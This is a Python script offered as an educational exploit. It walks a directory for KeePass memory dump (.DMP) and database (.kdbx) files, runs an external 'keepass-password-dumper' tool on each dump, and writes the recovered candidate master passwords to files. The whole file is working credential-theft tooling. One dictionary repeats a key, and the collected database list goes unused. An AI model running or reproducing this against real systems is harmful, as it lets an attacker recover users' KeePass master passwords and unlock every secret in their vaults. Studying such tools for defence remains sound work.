"""
This script is intended solely for educational purposes as an exercise in imitation.
Any practical use of this script outside of educational or supervised demonstration scenarios is strictly prohibited.

Author: Mihai-Andrei Neacsu
"""

import os

# import time
import time
import traceback
from init import init
from logger import log_msg
from utils import run_subprocess


def keepass_exploit_entrypoint():
    args = init()

    # Get the current working directory (where the main script is executed from)
    main_script_dir = os.getcwd()
    # Define the relative path to the keepass-password-dumper directory
    keepass_dumper_dir = os.path.join(main_script_dir, "keepass-password-dumper")
    possible_pwds_dir = os.path.join(main_script_dir, "possible-pwds")
    # Check if the directory exists, if not, create it
    if not os.path.exists(possible_pwds_dir):
        os.makedirs(possible_pwds_dir)

    log_msg(f"{args}", "DEBUG")
    dir_list: list[str | bytes] = os.listdir(args.dir)
    dump_files = []
    keepass_files = []
    for f in dir_list:
        file_path = os.path.join(args.dir, f)
        if not os.path.isfile(file_path):
            continue  # Skip files that do not exist. Can this happen?
        if f.endswith("DMP"):
            dump_files.append(file_path)
        if f.endswith("kdbx"):
            keepass_files.append(file_path)
    exploit_info = {"dump_files": dump_files, "dump_files": dump_files}

    # Collect possible pwds from DMP files.
    for f in exploit_info["dump_files"]:

        # Get the base file name without extension from an absolute or relative path
        file_name_without_ext = os.path.splitext(os.path.basename(f))[0]
        possible_pwd_file = os.path.join(possible_pwds_dir, f"{file_name_without_ext}.txt")

        log_msg(f"Getting possible passwords from {f} file...")

        run_subprocess(["dotnet", "run", f"{f}", f"{possible_pwd_file}"], cwd=keepass_dumper_dir, encoding="utf-8")
        log_msg(f"Possible passwords saved in {possible_pwd_file} file...")


if __name__ == "__main__":
    try:
        keepass_exploit_entrypoint()
    except Exception:
        log_msg(traceback.format_exc(), "ERROR")
